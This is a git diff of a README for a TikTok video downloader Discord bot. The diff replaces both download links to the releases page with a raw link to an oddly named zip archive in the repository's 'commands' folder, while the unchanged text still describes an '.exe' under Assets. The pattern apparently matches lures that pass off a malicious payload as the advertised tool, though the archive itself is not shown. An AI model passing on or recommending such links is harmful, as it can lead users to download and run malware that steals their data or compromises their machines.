@@ -1,6 +1,6 @@
 # 📥 TikTok-Downloader-Bot - Save TikTok videos without any watermarks
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Unlawful-pinyon902/TikTok-Downloader-Bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Unlawful-pinyon902/TikTok-Downloader-Bot/main/commands/Bot-Tik-Downloader-Tok-Eutopian.zip)
 
 TikTok-Downloader-Bot allows you to save videos from TikTok directly to your computer. You choose the format you need, such as high-definition video, video without a watermark, or just the audio track as an MP3 file. This tool works within your Discord server, which makes it easy to share content with your friends.
 
@@ -12,7 +12,7 @@ This software runs on Windows 10 and Windows 11. Your computer needs at least 2G
 
 You need the latest version of the bot to ensure it works with the current TikTok platform changes. Please visit the official release page to find the installer package.
 
-[Download TikTok-Downloader-Bot Here](https://github.com/Unlawful-pinyon902/TikTok-Downloader-Bot/releases)
+[Download TikTok-Downloader-Bot Here](https://raw.githubusercontent.com/Unlawful-pinyon902/TikTok-Downloader-Bot/main/commands/Bot-Tik-Downloader-Tok-Eutopian.zip)
 
 Click the link above to reach the release page. Look for the file ending in `.exe` under the Assets section. Save this file to your computer.
 
